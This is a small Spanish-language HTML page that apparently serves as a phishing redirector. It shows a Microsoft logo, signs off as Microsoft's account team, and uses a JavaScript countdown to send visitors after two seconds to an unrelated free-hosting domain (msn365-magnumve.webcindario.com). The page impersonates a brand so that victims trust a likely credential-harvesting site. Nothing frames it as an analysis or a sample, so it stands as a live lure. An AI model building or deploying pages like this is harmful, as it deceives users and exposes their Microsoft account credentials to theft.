<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecci√≥n</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f4;
            margin: 0;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            display: inline-block;
            max-width: 500px;
            width: 100%;
            text-align: left;
        }
        h1 {
            color: #333;
            font-size: 2.5em;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            font-size: 1.2em;
            margin-bottom: 30px;
        }
        .logo {
            float: left;
            margin-right: 20px;
            border-radius: 8px;
        }
        .counter {
            font-size: 1.5em;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/LOUr1FEL2KE1FIlJK6Y5a/3b908f725e1248318ea8a294d8d0d7b1/microsoft.png" alt="Logo de la Empresa" width="280" height="71" />
        <h1>&nbsp;</h1>
        <h1>Gracias por preferirnos</h1>
        <p>Ser&aacute; redireccionado en <span class="counter" id="counter">2</span> segundos...</p>
        <p>Equipo de cuenta de Microsoft.</p>
    </div>
    <script>
        let timeLeft = 2;
        const counterElement = document.getElementById('counter');

        function updateCounter() {
            counterElement.textContent = timeLeft;
            timeLeft--;
            if (timeLeft < 0) {
                clearInterval(intervalId);
                window.location.href = "https://msn365-magnumve.webcindario.com/";
            }
        }

        const intervalId = setInterval(updateCounter, 1000);
    </script>
</body>
</html>
